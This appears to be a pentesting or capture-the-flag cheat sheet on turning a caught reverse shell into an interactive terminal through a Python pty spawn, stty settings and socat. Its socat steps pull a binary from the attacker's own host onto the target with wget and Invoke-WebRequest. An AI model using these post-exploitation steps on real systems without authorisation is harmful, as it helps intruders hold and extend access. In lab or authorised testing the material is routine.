### Python

1. Making the shell prettier (Cant use tab, arrows and Ctrl + C): `python -c 'import pty;pty.spawn("/bin/bash")'`
2. Get access to commands such as `clear`: `export TERM=xterm`
3. Background the shell: Ctrl + Z
4. Get a fully interactive shell and foreground the shell: `stty raw -echo; fg`
5. Type `reset` when the shell dies for visible input

### Socat

Description: Getting a Netcat shell than upgrading it to Socat shell, not useful for windows

1. Get a Netcat shell
2. Download [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) to your local machine
3. Start a Python HTTP server: `sudo python3 -m http.server`
4. Use the Netcat shell to donload the file to target: `wget <LOCAL-IP>/socat -O /tmp/socat`
5. In windows: `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`

### stty

Description: Change your terminal tty size

1. Check the value of rows and columns in your own terminal: `stty -a`
2. Change the row size in the shell: `stty rows <number>`
3. Change the column size in the shell: `stty cols <number>`